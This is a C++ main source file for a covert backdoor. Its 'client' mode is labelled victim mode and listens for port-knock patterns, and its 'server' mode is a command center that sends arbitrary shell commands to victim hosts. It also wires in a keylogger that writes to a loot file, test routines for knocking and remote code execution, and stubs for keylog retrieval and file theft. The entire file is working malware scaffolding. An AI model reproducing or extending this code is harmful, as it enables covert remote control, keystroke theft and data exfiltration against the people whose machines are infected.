#include "main.h"

#include <vector>

#include <unistd.h>

#include "Crypto.h"
#include "NetworkEngine.h"
#include "RemoteCodeExecuter.h"
#include "TcpStack.h"
#include "UdpStack.h"
#include "authenticator.h"

#include "Keylogger.h"

const short sport = 42069;
const short dport = 7575;

const std::string testCmd("uname -an");
unsigned int testAddr = 0xc0a80166;

UCharVector data({'a', 'b', 'c', 'd', 'e'});

// TODO: Remove
void testKeylogger(const Properties &p) {
    Keylogger kl(p.at("keylogLootFile"));
    kl.start_logging(); // should be started in another thread
}

// TODO: Remove
void testKnock(const Properties &p) {
    const std::string &interface = p.at("interface");
    const std::string &key = p.at("key");

    const std::string &knockPattern = p.at("knockPattern");
    unsigned short knockPort = std::stoi(p.at("knockPort"));
    unsigned int knockDuration = std::stoi(p.at("knockDuration"));

    NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
    netEngine.startAsyncSniff("ip and udp");
    netEngine.knockAndSend(*netEngine.getIp(), data);
    netEngine.stopAsyncSniff();
}

// TODO: Remove
void testRce(const Properties &p) {
    const std::string &interface = p.at("interface");
    const std::string &key = p.at("key");

    const std::string &knockPattern = p.at("knockPattern");
    unsigned short knockPort = std::stoi(p.at("knockPort"));
    unsigned int knockDuration = std::stoi(p.at("knockDuration"));

    struct in_addr daddr;
    daddr.s_addr = testAddr;

    NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);

    netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
    netEngine.startAsyncSniff("ip and tcp");

    sleep(1);
    RemoteCodeExecuter::sendCommand(&netEngine, daddr, testCmd);

    sleep(30);
    netEngine.stopAsyncSniff();
}

// TODO: Remove
void testRceRes(const Properties &p) {
    const std::string &interface = p.at("interface");
    const std::string &key = p.at("key");

    const std::string &knockPattern = p.at("knockPattern");
    unsigned short knockPort = std::stoi(p.at("knockPort"));
    unsigned int knockDuration = std::stoi(p.at("knockDuration"));

    NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);

    RemoteCodeExecuter::executeCommand(&netEngine, testAddr, testCmd.c_str());
}

int main(int argc, char *argv[]) {
    Properties p = getConfig("backdoor.conf");

    if (argc != 2) {
        printUsage(argv[0]);
        return 0;
    }

    std::string option(argv[1]);

    if (option == "client") {
        return clientMode(p);
    }

    if (option == "server") {
        return serverMode(p);
    }

    if (option == "test") {
        // testKeylogger(p);
        // testKnock(p);
        testRce(p);
        // testRceRes(p);
    }

    printUsage(argv[0]);

    return 0;
}

void printUsage(const char *name) {
    std::cout << "Usage: " << name << " [client|server|test]" << std::endl;
    std::cout << "\tclient - client mode a.k.a victim mode" << std::endl;
    std::cout << "\tserver - server mode a.k.a command center mode" << std::endl;
    std::cout << "\ttest - testing mode" << std::endl;
}

/*
 * Opens and parses the configuration file for and stores the key value pairs in a hash map.
 *
 * Params:
 *      const std::string &filename: The relative path of the configuration file.
 *
 * Returns:
 *      The hash map containing all the successfully parsed key value pairs of the configuration
 *      file.
 */
Properties getConfig(const std::string &filename) {
    std::ifstream file(filename);
    std::string line;
    Properties properties;

    if (file.is_open()) {
        while (std::getline(file, line)) {
            std::istringstream is_line(line);
            std::string key;

            if (std::getline(is_line, key, '=')) {
                std::string value;

                if (key[0] == '#') {
                    continue;
                }

                if (std::getline(is_line, value)) {
                    properties[key] = value;
                }
            }
        }
    }

    return properties;
}

/*
 * The main entry point for client mode or "victim mode".
 *
 * Params:
 *      const Properties &p: The list of configuration properties.
 *
 * Return:
 *      The exit code for the application.
 */
int clientMode(const Properties &p) {

    /*
    // we can use orphans to do our dirty work
    if (fork()) {
        return 0;
    }
    */

    const std::string &interface = p.at("interface");
    const std::string &key = p.at("key");

    const std::string &knockPattern = p.at("knockPattern");
    unsigned short knockPort = std::stoi(p.at("knockPort"));
    unsigned int knockDuration = std::stoi(p.at("knockDuration"));

    NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
    netEngine.startSyncSniff("ip");

    return 0;
}

/*
 * The main entry point for server mode or "command center".
 *
 * Params:
 *      const Properties &p: The list of configuration properties.
 *
 * Return:
 *      The exit code for the application.
 */
int serverMode(const Properties &p) {
    bool running;
    std::string line;
    std::vector<std::string> tokens;

    struct in_addr daddr;

    const std::string &interface = p.at("interface");
    const std::string &key = p.at("key");

    const std::string &knockPattern = p.at("knockPattern");
    unsigned short knockPort = std::stoi(p.at("knockPort"));
    unsigned int knockDuration = std::stoi(p.at("knockDuration"));

    NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
    netEngine.startAsyncSniff("ip");

    running = true;
    while (running) {
        std::cout << "server: ";
        std::cin >> line;

        tokens = tokenizeString(line);

        // format: quit
        if (tokens[0] == "quit") {
            running = false;
        }

        // format: exec [ip] [command]
        if (tokens[0] == "exec") {
            // check argument count
            if (tokens.size() < 2) {
                std::cerr << "server: Not enough arguments" << std::endl;
                break;
            }

            // convert and check ip
            if (!inet_aton(tokens[1].c_str(), &daddr)) {
                std::cerr << "server: Invalid destination host" << std::endl;
                break;
            }

            // run command
            RemoteCodeExecuter::sendCommand(&netEngine, daddr, line.substr(line.find(tokens[2])));
        }

        // format: keylog [ip]
        if (tokens[0] == "keylog") {
        }

        // format: get [ip] [file]
        if (tokens[0] == "get") {
        }
    }

    return 0;
}
